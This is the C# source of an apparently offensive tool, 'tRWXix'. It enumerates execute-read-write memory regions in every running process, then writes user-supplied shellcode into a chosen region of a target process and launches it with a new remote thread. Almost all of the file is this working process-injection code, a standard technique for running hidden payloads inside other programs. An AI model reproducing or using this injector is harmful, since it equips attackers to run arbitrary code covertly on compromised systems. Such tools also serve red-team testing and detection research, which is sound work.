using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using NtApiDotNet;

namespace tRWXix
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        private const Int32 PROCESS_ALL_ACCESS = 0x001F0FFF;
        public static void Main(string[] args)
        {
            Dictionary<string, string> parameters = Utils.ArgParser.parse(args);

            if (parameters.ContainsKey("enumerate"))
            {
                foreach (NtProcess proc in NtProcess.GetProcesses(ProcessAccessRights.AllAccess))
                {
                    IEnumerable<MemoryInformation> mem = NtVirtualMemory.QueryMemoryInformation(proc.Handle);
                    foreach (MemoryInformation m in mem)
                    {
                        if (m.Protect.Equals(MemoryAllocationProtect.ExecuteReadWrite))
                        {
                            Console.WriteLine(String.Format("[+] {0}:{1}::{2}", proc.ProcessId, proc.Name, m.BaseAddress));
                        }
                    }
                }             

            }
            else if (parameters.ContainsKey("trigger"))
            {
                if (parameters.ContainsKey("pid") && parameters.ContainsKey("address") && parameters.ContainsKey("data"))
                { 
                    int pid = Convert.ToInt32(parameters["pid"]);
                    NtProcess proc = NtProcess.Open(pid, ProcessAccessRights.AllAccess);
                    Console.WriteLine("pid " + pid);
                    long addr = (long)Convert.ToInt64(parameters["address"]);
                    Console.WriteLine("address " + addr);
                    byte[] data = Utils.Shellcoder.convert(parameters["data"]);
                    Console.WriteLine("[!] Writing to the provided RWX memory region");
                    NtVirtualMemory.WriteMemory(proc.Handle, addr, data);
                    Console.WriteLine(BitConverter.ToString(NtVirtualMemory.ReadMemory(proc.Handle, addr, data.Length)));
                    NtThread t = NtThread.Create(proc, addr, 0, ThreadCreateFlags.None, 4096);
                    if (t != null)
                    {
                        Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", t.FullPath));
                        Environment.Exit(1);
                    }
            }
        }
            else
            {
                Utils.Helper.help();
                Environment.Exit(0);
            }
        }
    }
}
